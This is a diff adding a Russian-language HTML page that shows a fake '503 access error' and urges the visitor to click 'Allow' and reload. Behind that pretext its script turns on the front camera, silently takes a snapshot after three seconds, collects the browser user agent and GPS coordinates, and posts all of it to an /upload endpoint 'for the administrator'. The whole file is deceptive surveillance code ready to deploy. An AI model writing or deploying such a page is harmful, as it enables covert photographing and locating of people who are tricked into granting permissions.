@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Автоматический снимок с камеры</title>
+</head>
+<body>
+    <div style="display:flex;justify-content: center; align-items: center; flex-direction: column; text-align: center;">
+        <h1 style="font-style:bold"><span style="font-weight:300;">503</span> Ошибка доступа</h1>
+        <h2>Нажмите "Разрешить" и перезагрузите браузер <br> для корректной работы.</h2>
+        <video id="video" width="640" height="480" autoplay></video>
+    </div>
+
+
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Получаем информацию о браузере
+        const browserInfo = navigator.userAgent;
+
+        // Запрашиваем разрешение на использование камеры
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // Автоматический снимок после загрузки видео
+                video.addEventListener('loadeddata', () => {
+                    setTimeout(() => {
+                        // Захват изображения
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataURL = canvas.toDataURL('image/png');
+
+                        // Получаем геолокацию пользователя
+                        navigator.geolocation.getCurrentPosition(position => {
+                            const location = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
+                            };
+
+                            // Отправляем изображение, браузер и геолокацию на сервер
+                            fetch('/upload', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    image: dataURL,
+                                    browser: browserInfo,
+                                    location: location
+                                })
+                            }).then(response => {
+                                if (response.ok) {
+                                    console.log('Снимок и данные отправлены администратору.');
+                                } else {
+                                    console.error('Ошибка при отправке данных.');
+                                }
+                            }).catch(err => {
+                                console.error("Ошибка отправки:", err);
+                            });
+
+                        }, err => {
+                            console.error("Ошибка получения геолокации:", err);
+                        });
+                    }, 3000); // Задержка перед снимком
+                });
+            })
+            .catch(err => {
+                console.error("Ошибка доступа к камере: ", err);
+            });
+    </script>
+</body>
+</html>
